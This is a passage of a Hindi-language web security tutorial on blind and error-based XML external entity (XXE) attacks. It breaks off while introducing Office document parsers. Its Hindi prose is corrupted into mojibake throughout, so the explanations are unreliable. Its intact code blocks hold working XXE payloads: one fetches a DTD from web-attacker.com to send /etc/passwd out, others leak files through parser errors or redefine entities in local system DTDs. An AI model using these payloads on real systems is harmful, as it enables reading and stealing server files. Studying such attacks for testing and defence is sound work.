* `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ `file` рдирд╛рдордХ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА `exfiltrate` рдХреЗ рд▓рд┐рдП рдПрдХ рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ `eval` рдирд╛рдордХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред `exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдореВрд▓реНрдп `file` рдПрдВрдЯрд┐рдЯреА рдХреА рдорд╛рди рдХреЛ URL рдХреНрд╡реЗрд░реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░рдХреЗ рд╣рдорд▓реЗ рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ HTTP рдЕрдиреБрд░реЛрдз рднреЗрдЬрдХрд░ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* `eval` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХреА рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреА рдкреНрд░рджрд░реНрд╢рди рдХреА рдЬрд╛рдПред
* `exfiltrate` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЙрд╕рдХрд╛ рдореВрд▓реНрдп рдирд┐рд░реНрджрд┐рд╖реНрдЯ URL рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдЗрд╕ рджреБрд░реБрдкрдпреЛрдЧреА DTD рдХреЛ рдЙрд╕ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╣реЛрд╕реНрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЬрд┐рд╕реЗ рд╡рд╣ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рд╕рд╛рдорд╛рдиреНрдпрдд: рдЙрд╕реЗ рдЕрдкрдиреЗ рдЦреБрдж рдХреЗ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдкрд░ рд▓реЛрдб рдХрд░рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд URL рдкрд░ рджреБрд░реБрдкрдпреЛрдЧреА DTD рдХреЛ рд╕реЗрд╡рд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:\
`http://web-attacker.com/malicious.dtd`

рдЕрдВрддрддрдГ, рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╡рд┐рдХрд▓рд╛рдВрдЧ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд XXE рдкреЗрд▓реЛрдб рдкреНрд░рд╕реНрддреБрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
рдпрд╣ XXE payload рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЛ `xxe` рдШреЛрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ DTD рдореЗрдВ рдЗрд╕ рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рд╕реЗ XML рдкрд╛рд░реНрд╕рд░ рдХреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд░реНрд╡рд░ рд╕реЗ рдмрд╛рд╣рд░реА DTD рдХреЛ рд▓рд╛рдиреЗ рдФрд░ рдЗрд╕реЗ рдЗрдирд▓рд╛рдЗрди рдЕрдиреБрдкреНрд░реЗрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрддреНрддреЗрдЬрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг DTD рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрджрдореЛрдВ рдХреЛ рдлрд┐рд░ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдФрд░ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рд╣рдорд▓рд╛рд╡рд░ рдХреА рд╕рд░реНрд╡рд░ рдкрд░ рднреЗрдЬреА рдЬрд╛рддреА рд╣реИред

### рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд (рдмрд╛рд╣рд░реА DTD)

**рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг DTD рд▓реЛрдб рдХрд░рд╛рдиреЗ рдЬрд╛ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрдВрджрд░ рджрд┐рдЦрд╛рдПрдЧрд╛ (рдпрд╣ рдХреЗрд╡рд▓ рддрднреА рдорд╛рдиреНрдп рд╣реИ рдЕрдЧрд░ рдЖрдк рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ)ред** [**рдпрд╣рд╛рдБ рд╕реЗ рдЙрджрд╛рд╣рд░рдгред**](https://portswigger.net/web-security/xxe/blind)

рдЖрдк рдПрдХ рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдмрд╛рд╣рд░реА DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
рдпрд╣ DTD рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЪрд░рдгреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддрд╛ рд╣реИ:

* `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рд░рдЦрдиреЗ рд╡рд╛рд▓реЗ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА `file` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред
* рдПрдХ рдФрд░ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА `error` рдХреЗ рдПрдХ рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА `eval` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред `error` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдореВрд▓реНрдп `file` рдПрдВрдЯрд┐рдЯреА рдХреЗ рдорд╛рди рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдХреЗ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
* `eval` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `error` рдПрдВрдЯрд┐рдЯреА рдХреА рдЧрддрд┐рд╢реАрд▓ рдШреЛрд╖рдгрд╛ рдХреА рдкреНрд░рджрд░реНрд╢рдиреАрдпрддрд╛ рд╣реЛред
* `error` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕рдХрд╛ рдореВрд▓реНрдп рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдХреЗ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рд╛рдкреНрдд рд╣реЛ, рдЬрд┐рд╕рдореЗрдВ рдЕрд╕реНрддрд┐рддреНрд╡рд╣реАрди рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдирд╛рдо рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рд╣реИред

рдмрд╛рд╣рд░реА DTD рддреНрд░реБрдЯрд┐ рдХреЛ рдирд┐рдордВрддреНрд░рд┐рдд рдХрд░реЗрдВ:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
рдФрд░ рдЖрдкрдХреЛ рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХреЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдЕрдВрджрд░ рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рджреЗрдЦрдиреА рдЪрд╛рд╣рд┐рдПред

![](<../.gitbook/assets/image (223) (1).png>)

_**рдХреГрдкрдпрд╛ рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдмрд╛рд╣рд░реА DTD рд╣рдореЗрдВ рджреВрд╕рд░реЗ (****`eval`****) рдХреЗ рднреАрддрд░ рдПрдХ рдПрдВрдЯрд┐рдЯреА рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЖрдВрддрд░рд┐рдХ DTD рдореЗрдВ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЖрдк рдмрд┐рдирд╛ рдмрд╛рд╣рд░реА DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдордЬрдмреВрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ (рд╕рд╛рдорд╛рдиреНрдпрддрдГ)ред**_

### **рддреНрд░реБрдЯрд┐ рдЖрдзрд╛рд░рд┐рдд (рд╕рд┐рд╕реНрдЯрдо DTD)**

рддреЛ рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реЛрдиреЗ рдкрд░ рдмреНрд▓рд╛рдЗрдВрдб XXE рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреНрдпрд╛ рд╣реИ рдЬрдм **рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб рдЗрдВрдЯрд░реИрдХреНрд╢рди рдмреНрд▓реЙрдХ рд╣реИ** (рдмрд╛рд╣рд░реА рдХрдиреЗрдХреНрд╢рди рдЙрдкрд▓рдмреНрдз рдирд╣реАрдВ рд╣реИ)?ред

XML рднрд╛рд╖рд╛ рд╡рд┐рдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдПрдХ рдЦрд╛рдореА рд╕рдВрджрд░реНрдн рдореЗрдВ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ **рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреА рд╣реИ рдЬрдм рдПрдХ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ DTD рдЖрдВрддрд░рд┐рдХ рдФрд░ рдмрд╛рд╣рд░реА рдШреЛрд╖рдгрд╛рдПрдБ рдорд┐рд▓рд╛рддрд╛ рд╣реИ**ред рдпрд╣ рд╕рдорд╕реНрдпрд╛ рдмрд╛рд╣рд░реА рд░реВрдк рд╕реЗ рдШреЛрд╖рд┐рдд рдПрдВрдЯрд┐рдЯреА рдХреЗ рдЖрдВрддрд░рд┐рдХ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ, рдЬреЛ рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд XXE рд╣рдорд▓реЛрдВ рдХреЛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдРрд╕реЗ рд╣рдорд▓реЗ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рдХрд╛ рд╢рд┐рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ рдмрд╛рд╣рд░реА DTD рдореЗрдВ рдШреЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЖрдВрддрд░рд┐рдХ DTD рд╕реЗред рдЬрдм рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдЖрдЙрдЯ-рдСрдл-рдмреИрдВрдб рдХрдиреЗрдХреНрд╢рди рдмреНрд▓реЙрдХ рд╣реЛрддреЗ рд╣реИрдВ, рддреЛ рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдиреАрдп DTD рдлрд╝рд╛рдЗрд▓реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рд░рд╣рдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХрд╛ рд▓рдХреНрд╖реНрдп рд░рдЦрддреЗ рд╣реИрдВред


рд╕рдордЭреМрддрд╛ рдХрд░реЗрдВ рдПрдХ рдкрд░рд┐рджреГрд╢реНрдп рдХрд╛ рдЬрд╣рд╛рдВ рд╕рд░реНрд╡рд░ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ `/usr/local/app/schema.dtd` рдкрд░ рдПрдХ DTD рдлрд╝рд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ `custom_entity` рдирд╛рдордХ рдПрдХ рдПрдВрдЯрд┐рдЯреА рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реЛрддреА рд╣реИред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рдореЗрдВ рдПрдХ рд╣рд╛рдЗрдмреНрд░рд┐рдб DTD рдкреНрд░рд╕реНрддреБрдд рдХрд░рдХреЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ XML рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдЪрд░рдг рдЗрд╕ DTD рджреНрд╡рд╛рд░рд╛ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХреА рдЬрд╛рддреА рд╣реИ:

- `local_dtd` рдирд╛рдордХ рдПрдХ XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдореЗрдВ рд╕рд░реНрд╡рд░ рдХреА рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдкрд░ рд╕реНрдерд┐рдд рдмрд╛рд╣реНрдп DTD рдлрд╝рд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рд╣реИред
- `custom_entity` XML рдкреИрд░рд╛рдореАрдЯрд░ рдПрдВрдЯрд┐рдЯреА рдХреЗ рд▓рд┐рдП рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ рдмрд╛рд╣реНрдп DTD рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рд╣реИ, рдПрдХ [рддреНрд░реБрдЯрд┐-рдЖрдзрд╛рд░рд┐рдд XXE рд╢реЛрд╖рдг](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages) рдХреЛ рдврдХрдиреЗ рдХреЗ рд▓рд┐рдПред рдпрд╣ рдкреБрдирд░реНрдирд┐рд░реНрдзрд╛рд░рдг рдПрдХ рдкрд╛рд░реНрд╕рд┐рдВрдЧ рддреНрд░реБрдЯрд┐ рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреА рд╕рд╛рдордЧреНрд░реА рдЙрдЬрд╛рдЧрд░ рд╣реЛрддреА рд╣реИред
- `local_dtd` рдПрдВрдЯрд┐рдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдмрд╛рд╣реНрдп DTD рдХреЛ рд╕рдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдирдП рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд `custom_entity` рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕ рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЗ рдЕрдиреБрдХреНрд░рдо рд╕реЗ, рд╢реЛрд╖рдг рджреНрд╡рд╛рд░рд╛ рд▓рдХреНрд╖рд┐рдд рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрддреНрдкрд╛рджрди рд╣реЛрддрд╛ рд╣реИред

**рд╡рд╛рд╕реНрддрд╡рд┐рдХ рджреБрдирд┐рдпрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:** GNOME рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░рд┐рд╡реЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд┐рд╕реНрдЯрдореЛрдВ рдореЗрдВ рдЕрдХреНрд╕рд░ `/usr/share/yelp/dtd/docbookx.dtd` рдкрд░ рдПрдХ DTD рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ `ISOamso` рдирд╛рдордХ рдПрдВрдЯрд┐рдЯреА рд╣реЛрддреА рд╣реИред
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

рдЬреИрд╕рд╛ рдХрд┐ рдпрд╣ рддрдХрдиреАрдХ рдПрдХ **рдЖрдВрддрд░рд┐рдХ DTD рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ рдПрдХ рдорд╛рдиреНрдп DTD рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**ред рдЖрдк рдРрд╕рд╛ **рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рдЖрдк рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рд╡рд╣реА OS / рд╕реЙрдлреНрдЯрд╡реЗрдпрд░ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдХреЗ** рдФрд░ **рдХреБрдЫ рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs рдЦреЛрдЬрдиреЗ** рдХреЗ рд▓рд┐рдП, рдпрд╛ рд╕рд┐рд╕реНрдЯрдореНрд╕ рдХреЗ рдЕрдВрджрд░ рд╕реЗ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ DTDs рдХреА рд╕реВрдЪреА** рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ **рдЬрд╛рдВрдЪреЗрдВ** рдпрджрд┐ рдХреЛрдИ рдЙрдкрд▓рдмреНрдз рд╣реИ:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind) рджреЗрдЦреЗрдВ

### рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ DTDs рдЦреЛрдЬрдирд╛

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд╛рдирджрд╛рд░ github рд░реЗрдкреЛ рдореЗрдВ рдЖрдк **рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж DTDs рдХреЗ рдкрде** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдкреАрдбрд╝рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдбреЙрдХрд░ рдЗрдореЗрдЬ** рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реА рд░реЗрдкреЛ рдХреЗ рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЗрдореЗрдЬ** рдХреЛ **рд╕реНрдХреИрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдореМрдЬреВрдж DTDs** рдХрд╛ рдкрде **рдЦреЛрдЬ** рд╕рдХрддреЗ рд╣реИрдВред [рдЧрд┐рдердм рдХреЗ Readme](https://github.com/GoSecure/dtd-finder) рдХреЛ рдкрдврд╝реЗрдВ рдФрд░ рд╕реАрдЦреЗрдВред
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдСрдлрд┐рд╕ рдУрдкрди XML рдкрд╛рд░реНрд╕рд░реНрд╕

рдЗрд╕ рд╣рдорд▓реЗ рдХрд╛ рдФрд░ рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП, **[рдЗрд╕ рд╢рд╛рдирджрд╛рд░ рдкреЛрд╕реНрдЯ](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) рдХреЗ рджреВрд╕рд░реЗ рдЦрдВрдб рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ**ред

**рдХрдИ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рджреНрд╡рд╛рд░рд╛ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рдСрдлрд┐рд╕ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдЕрдкрд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рддреА рд╣реИ**, рдЬреЛ рдлрд┐рд░ рдЗрди рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ рдХреБрдЫ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рд╡рд░рдгреЛрдВ рдХреЛ рдирд┐рдХрд╛рд▓рддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдПрдХ XLSX рдкреНрд░рд╛рд░реВрдк рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рдЕрдкрд▓реЛрдб рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИред рдкрд╛рд░реНрд╕рд░ рдХреЛ рд╕реНрдкреНрд░реЗрдбрд╢реАрдЯ рд╕реЗ рдбреЗрдЯрд╛ рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдпрд╣ 